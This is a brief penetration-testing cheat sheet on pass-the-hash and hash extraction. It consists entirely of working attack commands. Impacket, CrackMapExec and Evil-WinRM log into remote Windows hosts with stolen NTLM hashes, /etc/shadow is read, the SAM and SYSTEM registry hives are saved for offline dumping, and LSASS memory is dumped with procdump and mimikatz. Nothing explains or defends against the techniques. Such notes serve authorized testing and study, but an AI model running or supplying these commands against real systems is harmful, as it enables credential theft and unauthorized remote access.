# Pass-the-Hash (PtH) & Hash Extraction

## PtH - Impacket
```bash
impacket-wmiexec $DOMAIN/user@$TARGET_IP -hashes LMHASH:NTHASH
impacket-psexec $DOMAIN/user@$TARGET_IP -hashes LMHASH:NTHASH
impacket-smbexec $DOMAIN/user@$TARGET_IP -hashes LMHASH:NTHASH
```

## PtH - CrackMapExec
```bash
crackmapexec smb $TARGET_IP -u admin -H NTHASH
crackmapexec winrm $TARGET_IP -u admin -H NTHASH
```

## PtH - Evil-WinRM
```bash
evil-winrm -i $TARGET_IP -u admin -H NTHASH
```

## Hash Extraction (Linux)
```bash
cat /etc/shadow
```

## Hash Extraction (Windows - SAM)
```cmd
reg save hklm\sam sam.hive
reg save hklm\system system.hive
# On Kali: impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

## Hash Extraction (Windows - LSASS)
```cmd
# Procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```
